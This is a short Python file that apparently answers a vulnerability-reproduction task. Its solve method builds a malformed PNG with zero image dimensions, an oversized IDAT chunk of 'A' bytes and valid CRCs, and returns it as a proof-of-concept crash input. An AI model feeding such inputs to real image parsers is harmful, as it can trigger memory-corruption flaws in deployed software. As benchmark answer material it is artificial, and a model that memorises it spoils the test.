from binascii import crc32

class Solution:
    def solve(self, src_path: str) -> bytes:
        sig = b'\x89PNG\r\n\x1a\n'
        ihdr_len = b'\x00\x00\x00\x0d'
        ihdr_type = b'IHDR'
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x02\x00\x00\x00'
        ihdr_crc_data = ihdr_type + ihdr_data
        ihdr_crc_val = crc32(ihdr_crc_data) & 0xffffffff
        ihdr_crc = bytes([
            (ihdr_crc_val >> 24) & 0xff,
            (ihdr_crc_val >> 16) & 0xff,
            (ihdr_crc_val >> 8) & 0xff,
            ihdr_crc_val & 0xff
        ])
        header = sig + ihdr_len + ihdr_type + ihdr_data + ihdr_crc

        L = 2879
        idat_data = b'A' * L
        idat_len = L.to_bytes(4, 'big')
        idat_type = b'IDAT'
        idat_crc_data = idat_type + idat_data
        idat_crc_val = crc32(idat_crc_data) & 0xffffffff
        idat_crc = bytes([
            (idat_crc_val >> 24) & 0xff,
            (idat_crc_val >> 16) & 0xff,
            (idat_crc_val >> 8) & 0xff,
            idat_crc_val & 0xff
        ])
        idat = idat_len + idat_type + idat_data + idat_crc

        iend_len = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_crc_data = iend_type
        iend_crc_val = crc32(iend_crc_data) & 0xffffffff
        iend_crc = bytes([
            (iend_crc_val >> 24) & 0xff,
            (iend_crc_val >> 16) & 0xff,
            (iend_crc_val >> 8) & 0xff,
            iend_crc_val & 0xff
        ])
        iend = iend_len + iend_type + b'' + iend_crc

        poc = header + idat + iend
        assert len(poc) == 2936
        return poc
